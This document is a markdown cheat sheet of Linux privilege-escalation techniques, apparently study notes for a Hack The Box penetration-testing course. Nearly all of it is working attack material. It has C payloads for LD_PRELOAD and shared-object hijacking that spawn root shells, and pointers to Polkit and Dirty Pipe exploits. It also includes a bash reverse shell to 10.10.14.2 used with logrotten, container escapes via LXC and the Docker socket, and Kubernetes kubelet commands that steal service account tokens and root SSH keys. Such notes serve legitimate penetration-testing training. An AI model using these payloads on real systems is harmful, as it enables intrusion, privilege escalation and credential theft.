## Linux

### Environnement
```bash
hostname
cat /etc/os-release
uname -a
echo $PATH
env
lscpu
cat /etc/shells
history
lastlog
getfacl -R / -s 2>/dev/null
```

### List Processes
```bash
ps aux
ps aux | grep root
```

### Polkit
```bash
pkexec -u root id
git clone https://github.com/arthepsy/CVE-2021-4034.git
gcc cve-2021-4034-poc.c -o poc
```

### Dirty Pipe
```bash
# git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
uname -r
# output : 5.13.0-46-generic
```


### Sudo 
```bash
sudo -l
sudo -V
sudo -version
sudo -u#-1 id
```

### Network
```bash
ip a
ss -tnlp
route
arp -a
cat /etc/hosts
```

### List users & groups
```bash
ls /home
fgrep "bash" /etc/passwd
fgrep -v "nologin" /etc/passwd
cat /etc/group
w
id
```

### File Systems & Drives
```bash
df -h
lsblk
cat /etc/fstab
cat /etc/fstab | grep -v "#" | column -t
ls -l /tmp /var/tmp /dev/shm

# SUID and SETGID bit
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
# Config file
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
# Shared object required by binary
ldd /bin/ls
# Find specific files (hidden file and directory / sh scripts / config file)
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep $USER
find / -type d -name ".*" -ls 2>/dev/null
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
# Enumerate capabilities
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
getcap -r / 2>/dev/null
getcap /path/2/binary
# Trace System Calls
strace <binary>
```

### Writables files & directory
```bash
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
```

### Use case : LD_PRELOAD
```bash
htb_student@NIX02:~$ sudo -l
Matching Defaults entries for daniel.carter on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD
```
Use this exploit in C :
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
Compile and execute :
```bash
gcc -fPIC -shared -o root.so root.c -nostartfiles
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

### Shared Object Hijacking

```bash
ldd --version
ldd /path/2/binary
readelf -d /path/2/binary | grep PATH
```
Create malicious .so file
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
```
Compile it 
```bash
gcc src.c -fPIC -shared -o /path/2/lib/lib.so
```

### Python Object Hijacking
https://academy.hackthebox.com/module/51/section/1640


### Crontab
```bash
ls -la /etc/cron.daily/
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
pspy
```

### NFS Weak privileges
```bash
showmount -e $TARGET
cat /etc/exports
sudo mount -t nfs $TARGET:/tmp /mnt
```

### Tmux Session Hijack
```bash
ps aux | grep tmux
# output example : root      4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shareds new -s debugsess
ls -la /shareds 
tmux -S /shareds
```

### Path abuse
https://academy.hackthebox.com/module/51/section/472

```bash
echo $PATH
PATH=.:${PATH}
export PATH
echo $PATH
.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
touch ls 
echo 'echo "PATH ABUSE!!"' > ls
chmod +x ls
ls
# From cpts course :
htb_student@NIX02:~$ ls
PATH ABUSE!!
```

### Escaping Restricted Shells
```bash
ssh $USER@$IP -t "bash --noprofile --norc"
ls -l `pwd`
```

### Logrotate
https://academy.hackthebox.com/module/51/section/1589
Vulnerable versions :
- 3.8.6
- 3.11.0
- 3.15.0
- 3.18.0

```bash
man logrotate
logrotate --help
cat /etc/logrotate.conf
sudo cat /var/lib/logrotate.status
ls /etc/logrotate.d/
cat /etc/logrotate.d/dpkg

logger@nix02:~$ git clone https://github.com/whotwagner/logrotten.git
logger@nix02:~$ cd logrotten
logger@nix02:~$ gcc logrotten.c -o logrotten
echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
grep "create\|compress" /etc/logrotate.conf | grep -v "#"
./logrotten -p ./payload /tmp/tmp.log
```

### LXC PrivEsc

https://academy.hackthebox.com/module/51/section/1588

```bash
# Init process
lxd init
# Load local image
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
# Start privileged container
lxc init alpine r00t -c security.privileged=true
# Mount host file system inside the container
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
# Start container
lxc start r00t
```

### Docker
https://academy.hackthebox.com/module/51/section/2411
```bash
# check current groups
id 
docker image ls
docker -H unix:///app/docker.sock ps
docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
# log into container
docker -H unix:///app/docker.sock exec -it <container_id> /bin/bash

# abuse docker socket
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

### Kubernetes 
https://academy.hackthebox.com/module/51/section/2444
```bash
curl https://$TARGET:6443 -k
curl https://$TARGET:10250/pods -k | jq .
kubeletctl -i --server $TARGET pods
kubeletctl -i --server $TARGET scan rce
kubeletctl -i --server $TARGET exec "id" -p nginx -c nginx
kubeletctl -i --server $TARGET exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
kubeletctl --server $TARGET exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
export token=`cat k8.token`
kubectl --token=$token --certificate-authority=ca.crt --server=https://$TARGET:6443 auth can-i --list
kubectl --token=$token --certificate-authority=ca.crt --server=https://$TARGET:6443 apply -f privesc.yaml
kubectl --token=$token --certificate-authority=ca.crt --server=https://$TARGET:6443 get pods
kubeletctl --server $TARGET exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
```
